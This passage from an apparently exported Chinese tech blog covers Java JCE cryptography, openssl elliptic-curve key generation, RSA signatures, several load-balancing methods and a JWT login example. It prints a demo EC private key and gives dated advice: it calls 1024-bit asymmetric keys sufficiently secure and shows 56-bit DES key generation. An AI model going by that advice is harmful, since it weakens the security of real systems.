<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KeyGenerator gen = KeyGenerator.getInstance(&quot;DES&quot;);</span><br><span class="line">gen.init(56, new SecureRandom());</span><br><span class="line">Key key= gen.generateKey();</span><br></pre></td></tr></table></figure>

<h3 id="MAC生成"><a href="#MAC生成" class="headerlink" title="MAC生成"></a>MAC生成</h3><p>MAC技术用于确认数据的完整性，Mac要求通讯双方共享一个secret key，示例代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Key key = KeyGeneratorDemo.generateMac();</span><br><span class="line">Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);</span><br><span class="line">mac.init(key);</span><br><span class="line">String msg = &quot;测试&quot;;</span><br><span class="line">byte[] result = mac.doFinal(msg.getBytes(&quot;UTF-8&quot;));</span><br><span class="line">BASE64Encoder encoder = new BASE64Encoder();</span><br><span class="line">System.out.println(encoder.encode(result));</span><br></pre></td></tr></table></figure>
<p>MAC优于数据摘要的地方在于：MAC双方要共享一个密钥，所以其也有互相认证的功能，可有效防止数据摘要中明文和数据摘要被同时替换而无法发现的问题。</p>
<h3 id="密钥协商"><a href="#密钥协商" class="headerlink" title="密钥协商"></a>密钥协商</h3><p>密钥协商就是在通讯多方间不直接交换通讯密钥的情况下而选择一个大家达成一致的密钥(session key)，这个session key是对称密钥。</p>
<p>密钥协商可以通过2种途径实现：</p>
<ol>
<li>通过KeyAgreement组件完成，常用算法包括DH（Diffie-Hellman），ECDH（Elliptic Curve Diffie-Hellman），ECMQV（Elliptic Curve Menezes-Qu-Vanstone）等。</li>
<li>通过数字信封完成，常用算法包括RSA等。</li>
</ol>
<p>通过KeyAgreement使用DH算法协商密钥步骤：</p>
<ol>
<li>DH算法由PKCS#3定义，DH算法需在多方间交换公钥，大素数p，私钥的基数g，和私钥的长度l。设协商密钥的双方为Alice和Bob，则协商共涉及5个阶段:</li>
<li>Alice生成DH公私密钥对</li>
<li>Alice将公钥和算法参数p，g和l发送给Bob</li>
<li>Bob根据算法参数生成自己的公私密钥对，并将公钥发送给Alice</li>
<li>Alice使用自己的私钥和Bob的公钥通过KeyAgreement得到通讯密钥</li>
<li>Bob使用自己的私钥和Alice的公钥通过KeyAgreement得到与Alice相同的通讯密钥</li>
</ol>
<p>通过数字信封使用RSA算法协商密钥</p>
<p>数字信封的原理就是利用通讯对方的公钥加密目标密钥（session key，对称密钥），使用目标密钥对报文进行加密，然后将密钥密文与报文密文一起发送给接收方。接收方首先使用自己的私钥对密钥报文进行解密，这样就得到了协商后的密钥，再使用解密后的密钥解密报文，这样就得到了业务数据。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>JCE中最常用和最核心的功能就是加解密，此功能由Cipher组件提供，在使用Cipher前需对加密算法及参数先做出选择：</p>
<ol>
<li>算法选择</li>
</ol>
<p>对称算法一般速度较快，非对称算法速度较慢；对称算法的密钥管理比较困难，非对称算法密钥管理简单；非对称算法一般用于认证和加密会话密钥，通讯双方大部分也就是在开启会话时使用一次，对称算法一般用来加密双方之间的报文&#x2F;交换的数据，使用频度较高。</p>
<ol start="2">
<li>块&#x2F;流模式选择</li>
</ol>
<p>块（Block）模式加密以块为基本单位，适用于明文长度已知的情形；流（Stream）模式以bit或byte为加解密单位, 适用于明文长度未知、内容较大的情形，如加密一个套接字管道或文件读写流等，一般仅适用于硬件实现。块模式下不同算法的块大小可能不一样，一般都是2的次方数，大部分长度为64bits，整个明文长度不是块长度整倍数时，需在最后一个Block进行补长（Padding）</p>
<ol start="3">
<li>反馈模式选择</li>
</ol>
<p>使用块算法加密，如果明文有大量重复的内容，则对块加密后得到的密文也会存在大量的重复，这对密文分析、破解提供了极大的便利，为消除这方面的威胁，有个思路就是对不同块密文再进行运算，这样就极大去除了块密文与块明文几间的特征关联，这种做法称为块反馈模式。常见的反馈模式有：ECB、CBC、CFB、OFB等。对于第1个block，因没有其它块密文可供运算，有的模式引入了初始矢量（Initialization Vector，IV，由用户指定）作为第1个block内容，这样就进一步解决了第1个block密文的脆弱性。注意：尽量不要使用ECB模式。</p>
<ol start="4">
<li>补长方案选择</li>
</ol>
<p>JCE中支持的补长方案包括：NoPadding、PKCS5Padding、ISO10126Padding、OAEPWithAndPadding和SSL3Padding，NoPadding即不补长，其中最常用的就是PKCS5Padding和ISO10126Padding。</p>
<ol start="7">
<li>密钥的选择</li>
</ol>
<p>密钥可以使用KeyGenerator&#x2F;KeyPairGenerator生成，也可以由外部导入，还可以有密钥参数构造KeySpec再转换为Key。</p>
<ol start="6">
<li>密钥长度选择</li>
</ol>
<p>对于对称加密算法，128bits的密钥足够安全，条件许可请选择256bits，注意密钥长度大于128bits需单独下载并安装jurisdiction policy files；对于非对称加密算法，1024bits的密钥足够安全。</p>
<p>最后，如选用基于口令的算法或在用户输入密码时，请避免使用String来引用，使用char[]，用完立刻置空char[]，避免内存攻击，如heap dump分析等。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>密码术</category>
      </categories>
      <tags>
        <tag>密码术</tag>
        <tag>数字签名</tag>
      </tags>
  </entry>
  <entry>
    <title>【密码术】openssl椭圆曲线密钥对生成</title>
    <url>/blog/arch/crypto/openssleckey/</url>
    <content><![CDATA[<p>首先要查看支持哪些椭圆曲线：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl ecparam -list_curves</span><br></pre></td></tr></table></figure>

<p>比方说比特币用的<code>secp256k1</code>就支持。</p>
<h3 id="生成私钥"><a href="#生成私钥" class="headerlink" title="生成私钥"></a>生成私钥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl ecparam -genkey -name secp256k1 -out priv.key</span><br></pre></td></tr></table></figure>

<p>文件内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN EC PARAMETERS-----</span><br><span class="line">BgUrgQQACg==</span><br><span class="line">-----END EC PARAMETERS-----</span><br><span class="line">-----BEGIN EC PRIVATE KEY-----</span><br><span class="line">MHQCAQEEIENdSGdz4PmGgMrYi+2l0THNMlod3hPkjvWBwwjgcMF2oAcGBSuBBAAK</span><br><span class="line">oUQDQgAEXmPFJ8ek49mva3huqmLLAIJMI0PjtNGmVPRw3mQwfVjDRW0VlFhQmsqX</span><br><span class="line">qkD1iDnzgsDtYaIIv7lmTY2APgBwAg==</span><br><span class="line">-----END EC PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p><code>BgUrgQQACg==</code>是椭圆曲线的关键参数，对应<code>secp256k1</code>标识。</p>
<p>用<code>secp256k1</code>生成私钥每次私钥是不同的，但<code>EC PARAMETERS</code>都是相同的。</p>
<p>只有用不同的name指定不同曲线<code>EC PARAMETERS</code>才会不同。</p>
<p>因为私钥可以生成公钥，要用到曲线，所以要将曲线的标识写到密钥文件里。</p>
<h3 id="生成公钥"><a href="#生成公钥" class="headerlink" title="生成公钥"></a>生成公钥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl ec -in priv.key -pubout -out pub.key</span><br></pre></td></tr></table></figure>

<p>文件内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MFYwEAYHKoZIzj0CAQYFK4EEAAoDQgAEXmPFJ8ek49mva3huqmLLAIJMI0PjtNGm</span><br><span class="line">VPRw3mQwfVjDRW0VlFhQmsqXqkD1iDnzgsDtYaIIv7lmTY2APgBwAg==</span><br></pre></td></tr></table></figure>

<p>生成的应该是非压缩格式的公钥。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>密码术</category>
      </categories>
      <tags>
        <tag>密码术</tag>
        <tag>openssl</tag>
      </tags>
  </entry>
  <entry>
    <title>数字签名原理</title>
    <url>/blog/arch/crypto/signature/</url>
    <content><![CDATA[<p>签名的作用无非就是证明某个文件上的内容确实是我写的&#x2F;我认同的，别人不能冒充我的签名（不可伪造），我也不能否认上面的签名是我的（不可抵赖）。</p>
<p>我们知道，手写签名之所以不能伪造，是因为每一个人的笔迹都是独一无二的，即使模仿，也可以通过专家鉴定分别出来。而不可抵赖，是因为每个人的笔迹都有固定特征，这些特征是很难摆脱的。</p>
<p>正是这两点特性使得手写签名在日常生活中被广泛承认，比如签合同、借条等等。</p>
<p>而数字签名，它的作用跟手写签名其实是一样的，用来证明某个消息或者文件是本人发出&#x2F;认同的。我国在2005年就已经施行《电子签名法》，确立了电子签名（包括但不限于数字签名）的法律效力。</p>
<p>那么数字签名又是靠什么保证不可伪造和不可抵赖两个特性呢？</p>
<p>答案是利用公钥加密系统。常用的签名算法有</p>
<ol>
<li>RSA，基于大整数分解问题</li>
<li>DSA，基于离散对数问题</li>
<li>ECDSA，属于DSA的一个变种，基于椭圆曲线上的离散对数问题</li>
</ol>
<p>其中RSA是实现数字签名最简单的公钥加密方法。</p>
<h2 id="RSA签名"><a href="#RSA签名" class="headerlink" title="RSA签名"></a>RSA签名</h2><p>RSA是一个非常神奇的加密算法，它具有一个离散对数和椭圆曲线加密都没有的特性：</p>
<p><code>既可以用公钥加密然后私钥解密，也可以用私钥加密然后公钥解密（对称性）。</code></p>
<p>公钥加密然后私钥解密，可以用于通信中拥有公钥的一方向拥有私钥的另一方传递机密信息，不被第三方窃听。</p>
<p>那么私钥加密然后公钥解密是用在什么场合呢？就是数字签名。</p>
<p>因为RSA中的每一个公钥都有唯一的私钥与之对应，任一公钥只能解开对应私钥加密的内容。换句话说，其它私钥加密的内容，这个公钥是解不开的。</p>
<p>这样，如果你生成了一对RSA密钥，你把公钥公布出去，并告诉全世界人这个公钥是你的。之后你只要在发送的消息，比如“123456”，后面加上用私钥加密过的密文，其他人拿公钥解密，看解密得到的内容是不是“123456”就可以知道这个“123456”是不是你发的。</p>
<p>其他人因为没有对应的私钥，所以没法生成公钥可以解密的密文，所以是不可伪造的。<br>又因为公钥对应的私钥只有一个，所以只要能成功解密，那么发消息的一定是你，不会是其他人，所以是不可抵赖的。</p>
<p>当然，在数字签名的过程中，我们不需要对“123456”保密，所以加密、解密这样的名词在这个场景中并不准确，用签名和解签会更合适。</p>
<p>实际应用中，由于直接对原消息进行签名有安全性问题，而且原消息往往比较大，直接使用RSA算法进行签名速度会比较慢，所以我们一般对消息计算其摘要（使用SHA-256等安全的摘要算法），然后对摘要进行签名。只要使用的摘要算法是安全的（MD5、SHA-1已经不安全了），那么这种方式的数字签名就是安全的。</p>
<p>一个具体的RSA签名过程如下：</p>
<ol>
<li>小明对外发布公钥，并声明对应的私钥在自己手上</li>
<li>小明对消息M计算摘要，得到摘要D</li>
<li>小明使用私钥对D进行签名，得到签名S</li>
<li>将M和S一起发送出去</li>
</ol>
<p>验证过程如下：</p>
<ol>
<li>接收者首先对M使用跟小明一样的摘要算法计算摘要，得到D</li>
<li>使用小明公钥对S进行解签，得到D’</li>
<li>如果D和D’相同，那么证明M确实是小明发出的，并且没有被篡改过</li>
</ol>
]]></content>
      <categories>
        <category>架构</category>
        <category>密码术</category>
      </categories>
      <tags>
        <tag>密码术</tag>
        <tag>数字签名</tag>
      </tags>
  </entry>
  <entry>
    <title>负载均衡之DNS域名解析</title>
    <url>/blog/arch/lb/dns/</url>
    <content><![CDATA[<p>DNS（Domain Name System）是因特网的一项服务，它作为域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网。人们在通过浏览器访问网站时只需要记住网站的域名即可，而不需要记住那些不太容易理解的IP地址。</p>
<p>在DNS系统中有一个比较重要的的资源类型叫做主机记录也称为A记录，A记录是用于名称解析的重要记录，它将特定的主机名映射到对应主机的IP地址上。</p>
<p>如果你有一个自己的域名，那么要想别人能访问到你的网站，你需要到特定的DNS解析服务商的服务器上填写A记录，过一段时间后，别人就能通过你的域名访问你的网站了。</p>
<p>DNS除了能解析域名之外还具有负载均衡的功能，下面是利用DNS工作原理处理负载均衡的工作原理图：</p>
<p><img src="/images/arch/baldns.jpg"></p>
<p>由上图可以看出，在DNS服务器中应该配置了多个A记录，如：</p>
<pre><code>www.mysite.com IN A 114.100.80.1;
www.mysite.com IN A 114.100.80.2;
www.mysite.com IN A 114.100.80.3;
</code></pre>
<p>因此，每次域名解析请求都会根据对应的负载均衡算法计算出一个不同的IP地址并返回，这样A记录中配置多个服务器就可以构成一个集群，并可以实现负载均衡。</p>
<p>DNS域名解析负载均衡有如下优点：</p>
<ol>
<li><p>将负载均衡的工作交给DNS，省去了网站管理维护负载均衡服务器的麻烦。</p>
</li>
<li><p>技术实现比较灵活、方便，简单易行，成本低，使用于大多数TCP&#x2F;IP应用。</p>
</li>
<li><p>对于部署在服务器上的应用来说不需要进行任何的代码修改即可实现不同机器上的应用访问。</p>
</li>
<li><p>服务器可以位于互联网的任意位置。</p>
</li>
<li><p>同时许多DNS还支持基于地理位置的域名解析，即会将域名解析成距离用户地理最近的一个服务器地址，这样就可以加速用户访问，改善性能。</p>
</li>
</ol>
<p>同时，DNS域名解析也存在如下缺点：</p>
<ol>
<li><p>目前的DNS是多级解析的，每一级DNS都可能缓存A记录，当某台服务器下线之后，即使修改了A记录，要使其生效也需要较长的时间，这段时间，DNS任然会将域名解析到已下线的服务器上，最终导致用户访问失败。</p>
</li>
<li><p>不能够按服务器的处理能力来分配负载。DNS负载均衡采用的是简单的轮询算法，不能区分服务器之间的差异，不能反映服务器当前运行状态，所以其的负载均衡效果并不是太好。</p>
</li>
<li><p>可能会造成额外的网络问题。为了使本DNS服务器和其他DNS服务器及时交互，保证DNS数据及时更新，使地址能随机分配，一般都要将DNS的刷新时间设置的较小，但太小将会使DNS流量大增造成额外的网络问题。</p>
</li>
</ol>
<p>事实上，大型网站总是部分使用DNS域名解析，利用域名解析作为第一级负载均衡手段，即域名解析得到的一组服务器并不是实际提供服务的物理服务器，而是同样提供负载均衡服务器的内部服务器，这组内部负载均衡服务器再进行负载均衡，请请求发到真实的服务器上，最终完成请求。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>负载均衡</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title>硬件负载均衡</title>
    <url>/blog/arch/lb/handware/</url>
    <content><![CDATA[<p>采用硬件的方式实现负载均衡，一般是单独的负载均衡服务器，价格昂贵，一般土豪级公司可以考虑，业界领先的有两款，F5和A10。</p>
<p>使用硬件负载均衡，主要考虑一下几个方面：</p>
<p>(1)功能考虑：功能全面支持各层级的负载均衡，支持全面的负载均衡算法，支持全局负载均衡;</p>
<p>(2)性能考虑：一般软件负载均衡支持到5万级并发已经很困难了，硬件负载均衡可以支持</p>
<p>(3)稳定性：商用硬件负载均衡，经过了良好的严格的测试，从经过大规模使用，在稳定性方面高;</p>
<p>(4)安全防护：硬件均衡设备除具备负载均衡功能外，还具备防火墙，防DDOS攻击等安全功能;</p>
<p>(5)维护角度：提供良好的维护管理界面，售后服务和技术支持;</p>
<p>(6)土豪公司：F5 Big Ip 价格：15w~55w不等;A10 价格：55w-100w不等;</p>
<p>缺点</p>
<p>(1)价格昂贵;</p>
<p>(2)扩展能力差;</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>负载均衡</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title>负载均衡之IP均衡</title>
    <url>/blog/arch/lb/ip/</url>
    <content><![CDATA[<p>首先让我们来看看下面这张大家都非常熟悉的TCP&#x2F;IP协议族的分层图：</p>
<p><img src="/images/arch/baltcpip.jpg"></p>
<p>关于每层在网络数据包传输过程中所起到的作用不是本文的重点，本文主要是讲解如何在网络层中使用IP来做服务器集群的负载均衡，为什么可以在这一层来做负载均衡。下面在来看IP协议的报头格式：</p>
<p><img src="/images/arch/balippro.jpg"></p>
<p>内红色框内的源地址和目的地址是IP负载均衡功能的关键所在，IP负载均衡又可以称之为网络层负载均衡，其核心原理就是通过内核驱动更改IP的目的地址来完成数据负载均衡的，如下图：</p>
<p><img src="/images/arch/balip.jpg"></p>
<p>如上图所示，用户请求数据包（源地址为200.10.10.1）到达负载均衡服务器114.100.80.10后，负载均衡服务器在内核进程获取网络数据包，根据一定的负载均衡算法得到一台内部的真实服务器10.0.0.1，然后将数据包的目的IP修改为10.0.0.1，此后数据包将会被发往10.0.0.1的服务器上，服务器处理完后，将向负载均衡服务器返回相应的数据包，负载均衡服务器在把源地址修改为200.10.10.1后将数据包传输给用户浏览器。在这一整个过程中，数据包没有通过用户的应用进程，因此该负载均衡的性能是非常之高的。</p>
<p>根据以上的图和上文的讲解，大家可能会觉得这很容易实现，其实不然，在这里需要处理关键的地方就是如何将集群内部服务器处理完后的数据返回给负载均衡服务器。因为，用户请求的数据包到达负载均衡服务器前的目的地址是114.100.80.10，源地址是200.10.10.1，通过负载均衡服务器修改后的目的地址是10.0.0.1，源地址还是200.10.10.1，所以处理后返回的数据包目的地址将是200.10.10.1，源地址是10.0.0.1，最终返回的数据包要回到负载均衡服务器就成了问题。</p>
<p>解决的办法大概有如下两种：</p>
<p>一、负载均衡服务器使用双网卡，一个对内一个对外，在修改请求数据包的目的IP的同时也修改源地址，将源地址设为自身的IP，即源地址转换（SNAT），这样内部集群服务器响应会再回到负载均衡服务器；</p>
<p>二、将负载均衡服务器作为真实物理服务器集群的网关服务器，这样所有的响应都将通过负载均衡服务器。</p>
<p>IP负载均衡在内核进程完成数据分发，处理性能得到了很好的提高。但是由于所有请求和响应都要经过负载均衡服务器，集群的最大响应数据吞吐量将受到负载均衡服务器网卡带宽的限制，对于提供下载服务或者视频服务等需要大量传输数据的站点而言，这是难以满足需求的。要是能让响应数据包绕过负载均衡服务器直接发往用户机器上就好了，有什么办法可以做到呢？当然有，那就是链路层的负载均衡。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>负载均衡</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title>负载均衡算法</title>
    <url>/blog/arch/lb/lbsf/</url>
    <content><![CDATA[<p>常用的负载均衡算法有，轮询，随机，最少链接，源地址散列，加权等方式;</p>
<h3 id="轮询"><a href="#轮询" class="headerlink" title="轮询"></a>轮询</h3><p>将所有请求，依次分发到每台服务器上，适合服务器硬件同相同的场景。</p>
<p>优点：服务器请求数目相同;</p>
<p>缺点：服务器压力不一样，不适合服务器配置不同的情况;</p>
<h3 id="随机"><a href="#随机" class="headerlink" title="随机"></a>随机</h3><p>请求随机分配到各个服务器。</p>
<p>优点：使用简单;</p>
<p>缺点：不适合机器配置不同的场景;</p>
<h3 id="最少链接"><a href="#最少链接" class="headerlink" title="最少链接"></a>最少链接</h3><p>将请求分配到连接数最少的服务器(目前处理请求最少的服务器)。</p>
<p>优点：根据服务器当前的请求处理情况，动态分配;</p>
<p>缺点：算法实现相对复杂，需要监控服务器请求连接数;</p>
<h3 id="Hash-源地址散列"><a href="#Hash-源地址散列" class="headerlink" title="Hash(源地址散列)"></a>Hash(源地址散列)</h3><p>根据IP地址进行Hash计算，得到IP地址。</p>
<p>优点：将来自同一IP地址的请求，同一会话期内，转发到相同的服务器;实现会话粘滞。</p>
<p>缺点：目标服务器宕机后，会话会丢失;</p>
<h3 id="加权"><a href="#加权" class="headerlink" title="加权"></a>加权</h3><p>在轮询，随机，最少链接，Hash’等算法的基础上，通过加权的方式，进行负载服务器分配。</p>
<p>优点：根据权重，调节转发服务器的请求数目;</p>
<p>缺点：使用相对复杂;</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>负载均衡</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title>负载均衡之HTTP重定向</title>
    <url>/blog/arch/lb/redirect/</url>
    <content><![CDATA[<p>HTTP重定向服务器是一台普通的应用服务器，其唯一个功能就是根据用户的HTTP请求计算出一台真实的服务器地址，并将该服务器地址写入HTTP重定向响应中（重定向响应状态码为302）返回给用户浏览器。用户浏览器在获取到响应之后，根据返回的信息，重新发送一个请求到真实的服务器上。</p>
<p>如下图所示</p>
<p><img src="/images/arch/balredirect.jpg"></p>
<p>重定向服务器计根据某种负载均衡算法算出真实的服务器地址为112.100.80.3并返回给用户浏览器，用户浏览器得到返回后重新对112.100.80.3发起了请求，最后完成访问。</p>
<p>这种负载均衡方案的有点是比较简单，缺点是浏览器需要两次请求服务器才能完成一次访问，性能较差；同时，重定向服务器本身的处理能力有可能成为瓶颈，整个集群的伸缩性规模有限；使用HTTP返回码302重定向，有可能使搜索引擎判断为SEO作弊，降低搜索排名。因此实践中很少使用这种负载均衡方案来部署。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>负载均衡</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title>负载均衡之反向代理</title>
    <url>/blog/arch/lb/proxy/</url>
    <content><![CDATA[<p>反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器，该服务器就可称之为代理服务器。由于代理服务器处在最终处理请求访问的服务器之前，因此可以在代理服务器上做负载均衡。实际上，互联网中也大量的存在反向代理服务器提供代理功能的同时也提供负载均衡的功能。其工作原理如下图所示：</p>
<p><img src="/images/arch/balproxy.jpg"></p>
<p>由上图可以推出，反向代理服务器，管理了一组服务器，可以根据对应的负载均衡算法将不同的请求转发到不同的服务器上。服务器处理完成的响应也通过代理服务器返回给用户。由于内部服务器不直接对外提供访问，因此，内部服务器地址不需要使用外部IP，而反向代理服务器则需要配置双网卡，提供内部和对外访问的IP地址。</p>
<p>与此同时，反相代理服务器还可以具有存储静态数据用于缓存的功能，从而加速处理用户请求，提高服务器处理性能。</p>
<p>反向代理服务器转发请求处于应用层协议上，因此，也称之为应用层负载均衡。该负载均衡方案与反向代理服务器功能集成到了一起，部署相对简单，但是，反向代理服务器会处理所有的请求和响应，其性能可能将会成为整个集群的瓶颈。</p>
<p>注：常用的代理服务器软件有：Fikker、Nginx、Squid等</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>负载均衡</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title>【SSO】JWT协议示例</title>
    <url>/blog/arch/sso/jwt/</url>
    <content><![CDATA[<h3 id="JSON-Web-Token是什么"><a href="#JSON-Web-Token是什么" class="headerlink" title="JSON Web Token是什么"></a>JSON Web Token是什么</h3><p>JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。</p>
<h3 id="什么时候你应该用JSON-Web-Tokens"><a href="#什么时候你应该用JSON-Web-Tokens" class="headerlink" title="什么时候你应该用JSON Web Tokens"></a>什么时候你应该用JSON Web Tokens</h3><p>下列场景中使用JSON Web Token是很有用的：</p>
<p>Authorization (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</p>
<p>Information Exchange (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥&#x2F;私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。</p>
<h3 id="JSON-Web-Token的结构是什么样的"><a href="#JSON-Web-Token的结构是什么样的" class="headerlink" title="JSON Web Token的结构是什么样的"></a>JSON Web Token的结构是什么样的</h3><p>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：</p>
<p>Header<br>Payload<br>Signature</p>
<p>因此，一个典型的JWT看起来是这个样子的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxxxx.yyyyy.zzzzz</span><br></pre></td></tr></table></figure>
<p>接下来，具体看一下每一部分：</p>
<p>Header</p>
<p>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS512&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>然后，用Base64对这个JSON编码就得到JWT的第一部分</p>
<p>Payload</p>
<p>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。</p>
<p>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。</p>
<p>Public claims : 可以随意定义。</p>
<p>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。</p>
<p>下面是一个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;sub&quot;:&quot;026a564bbfd84861ac4b65393644beef&quot;,&quot;iat&quot;:1558597028,&quot;exp&quot;:1559201828&#125;</span><br></pre></td></tr></table></figure>

<p>对payload进行Base64编码就得到JWT的第二部分</p>
<p>注意，不要在JWT的payload或header中放置敏感信息，除非它们是加密的。</p>
<p>Signature</p>
<p>为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中指定的那个，然对它们签名即可。</p>
<p>例如：</p>
<p>HMACSHA512(base64UrlEncode(header) + “.” + base64UrlEncode(payload), secret)</p>
<p>签名是用于验证消息在传递过程中有没有被更改，并且，对于使用私钥签名的token，它还可以验证JWT的发送方是否为它所称的发送方。</p>
<h3 id="登录示例"><a href="#登录示例" class="headerlink" title="登录示例"></a>登录示例</h3><p>登录过程：</p>
<ol>
<li>验证用户名和密码</li>
<li>生成token</li>
<li>返回token和过期时间</li>
</ol>
<p>验证用户名密码要根据业务来。</p>
<p>生成token方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public String generateToken(String userId) &#123;</span><br><span class="line">     Date nowDate = new Date();</span><br><span class="line">     //过期时间</span><br><span class="line">     Date expireDate = new Date(nowDate.getTime() + expire * 1000);</span><br><span class="line"></span><br><span class="line">     return Jwts.builder()</span><br><span class="line">             .setHeaderParam(&quot;typ&quot;, &quot;JWT&quot;)</span><br><span class="line">             .setSubject(userId)//主题，也差不多是个人的一些信息</span><br><span class="line">             .setIssuedAt(nowDate) //创建时间</span><br><span class="line">             .setExpiration(expireDate)//添加Token过期时间</span><br><span class="line">             //.setAudience(audience) //个人签名</span><br><span class="line">             //.setIssuer(issuer) //发送谁</span><br><span class="line">             .signWith(SignatureAlgorithm.HS512, secret)</span><br><span class="line">             .compact();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>生成token结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIwMjZhNTY0YmJmZDg0ODYxYWM0YjY1MzkzNjQ0YmVlZiIsImlhdCI6MTU1ODU5NzAyOCwiZXhwIjoxNTU5MjAxODI4fQ.ePnFkWzqRYA_XeP1lOsbr_ZKJtXFIIBqofszn3A47t1uyZYvFmhOIJI3r7ziAKjFwIml-f9zX50YbhOWIrWOPA</span><br></pre></td></tr></table></figure>
<p>用base64解密后如下：</p>
<p>header每次的token都一样，如下：</p>
<p>{“typ”:”JWT”,”alg”:”HS512”}</p>
<p>body每次会变，因为iat创建时间和exp过期时间每次会变：</p>
<p>{“sub”:”026a564bbfd84861ac4b65393644beef”,”iat”:1558597028,”exp”:1559201828}</p>
<h3 id="访问验证"><a href="#访问验证" class="headerlink" title="访问验证"></a>访问验证</h3><p>token在生成返回给客户端，以后客户端每个请求要在http header上带上，所有需要被验证的接口都从header上取出token，用如下方法验证：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">//验证token</span><br><span class="line">Claims claims = jwtUtils.getClaimByToken(token);</span><br><span class="line"> if(claims == null || jwtUtils.isTokenExpired(claims.getExpiration()))&#123;</span><br><span class="line">            throw new MyException(&quot;凭证失效，请重新登录&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Claims getClaimByToken(String token) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        return Jwts.parser()</span><br><span class="line">                .setSigningKey(secret)</span><br><span class="line">                .parseClaimsJws(token)</span><br><span class="line">                .getBody();</span><br><span class="line">    &#125;catch (Exception e)&#123;</span><br><span class="line">        logger.debug(&quot;token验证错误,请重新登陆 &quot;, e);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="核心逻辑"><a href="#核心逻辑" class="headerlink" title="核心逻辑"></a>核心逻辑</h3><p>token的核心在于签名，是通过下面设置实现的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">signWith(SignatureAlgorithm.HS512, secret)</span><br></pre></td></tr></table></figure>

<p>这里有的hamc，再加个密码盐。</p>
<p>对一个字符串，用hamc(string+secret)得到的hash值为签名。</p>
<p>因为secret这个字符串只有自己知道，所以别人是生成不了一个字符串的签名的。</p>
<p>这种签名逻辑就保证了token只有自己发出去的才有效，别人伪造不了。</p>
<h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><p>因为token是在请求中明文传的，所以如果不用https协议，别人可以获取到。</p>
<p>这样别人就可以用token访问服务了。</p>
<p>所以token和传输一定要保证安全，不加密一定用https。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>SSO</category>
      </categories>
      <tags>
        <tag>架构</tag>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>负载均衡之数据链路层</title>
